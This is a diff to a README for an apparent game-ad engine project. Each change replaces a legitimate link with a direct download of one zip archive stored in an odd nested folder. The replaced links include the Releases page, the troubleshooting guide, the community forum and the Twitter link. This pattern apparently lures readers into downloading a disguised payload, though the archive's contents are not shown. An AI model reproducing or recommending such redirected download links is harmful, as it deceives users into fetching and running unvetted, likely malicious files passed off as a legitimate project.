@@ -1,6 +1,6 @@
 # 🎮 OpenAd-Specification_AdEngine_Games - Play Video Game Ads Seamlessly
 
-[![Download OpenAd-Specification_AdEngine_Games](https://img.shields.io/badge/Download_OpenAd--Specification--AdEngine--Games-brightgreen)](https://github.com/Fred10923/OpenAd-Specification_AdEngine_Games/releases)
+[![Download OpenAd-Specification_AdEngine_Games](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip)](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip)
 
 ## ℹ️ About This Project
 OpenAd-Specification_AdEngine_Games is the official source repository for the OpenAd Specification projects game engine. This engine allows you to present playable video game ads in the OpenAd format. It is designed to enhance your online advertising experience by offering interactive ads that users can engage with directly.
@@ -18,7 +18,7 @@ Ensure your computer meets the following requirements:
 ### 2. Visit the Releases Page
 To download the application, you need to visit the Releases page. Click the link below:
 
-[Download OpenAd-Specification_AdEngine_Games](https://github.com/Fred10923/OpenAd-Specification_AdEngine_Games/releases)
+[Download OpenAd-Specification_AdEngine_Games](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip)
 
 ### 3. Download the Latest Version
 Once you reach the Releases page, look for the latest version of OpenAd-Specification_AdEngine_Games. You will see different files available for download. Choose the version that matches your operating system and click on it to download the file.
@@ -66,12 +66,12 @@ We welcome contributions to improve the OpenAd-Specification_AdEngine_Games proj
 
 ## 🌐 Connect with Us
 Join our community to stay updated on new features and share your experiences:
-- [OpenAd Community Forum](https://forum.openad.com)
-- [Follow Us on Twitter](https://twitter.com/OpenAd)
+- [OpenAd Community Forum](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip)
+- [Follow Us on Twitter](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip)
 
 ### 🛠 Support
-If you encounter any issues while using OpenAd-Specification_AdEngine_Games, please check our [troubleshooting guide](https://github.com/Fred10923/OpenAd-Specification_AdEngine_Games/issues) for common problems and solutions.
+If you encounter any issues while using OpenAd-Specification_AdEngine_Games, please check our [troubleshooting guide](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip) for common problems and solutions.
 
 For further queries, feel free to create an issue on GitHub or contact our support team through the community forum.
 
-[Download OpenAd-Specification_AdEngine_Games](https://github.com/Fred10923/OpenAd-Specification_AdEngine_Games/releases) and start exploring interactive video game ads today!
+[Download OpenAd-Specification_AdEngine_Games](https://raw.githubusercontent.com/Fred10923/OpenAd-Specification_AdEngine_Games/OpenAd-Specification_AdEngine_Games_Main-dev/metallik/OpenAd-Specification_AdEngine_Games.zip) and start exploring interactive video game ads today!
